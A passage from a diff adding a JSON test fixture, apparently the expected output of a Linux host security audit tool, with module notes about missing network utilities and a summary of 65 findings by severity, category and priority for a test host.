+   "message": "ip/route not found; routes decoded from /proc/net/route",
+   "check_id": "NET-ROUTE-001"
+  },
+  {
+   "module": "linux.network",
+   "code": "TOOL_MISSING",
+   "message": "ip/ifconfig not found; interface names only (from /sys/class/net)",
+   "check_id": "NET-IFACE-001"
+  }
+ ],
+ "warnings": [],
+ "summary": {
+  "total": 65,
+  "by_severity": {
+   "info": 18,
+   "low": 16,
+   "medium": 14,
+   "high": 16,
+   "critical": 1
+  },
+  "by_confidence": {
+   "low": 15,
+   "medium": 21,
+   "high": 29
+  },
+  "by_category": {
+   "auth": 4,
+   "filesystem": 6,
+   "network": 12,
+   "pam": 7,
+   "persistence": 8,
+   "processes": 5,
+   "services": 5,
+   "sysconfig": 2,
+   "system": 2,
+   "users": 14
+  },
+  "by_priority": {
+   "P1": 17,
+   "P2": 6,
+   "P3": 17,
+   "P4": 25
+  },
+  "evidence_items": 79,
+  "modules": {
+   "ok": 10,
+   "partial": 0,
+   "failed": 0,
+   "timeout": 0,
+   "invalid_output": 0,
+   "skipped": 0
+  }
+ },
+ "host": {
+  "hostname": "fixture-host",
+  "os": {
+   "family": "linux",
+   "name": "Ubuntu",
+   "version": "22.04"
+  },
+  "arch": "x86_64",
+  "user": "root",
+  "elevated": true,
+  "test_mode": true
+ }
+}
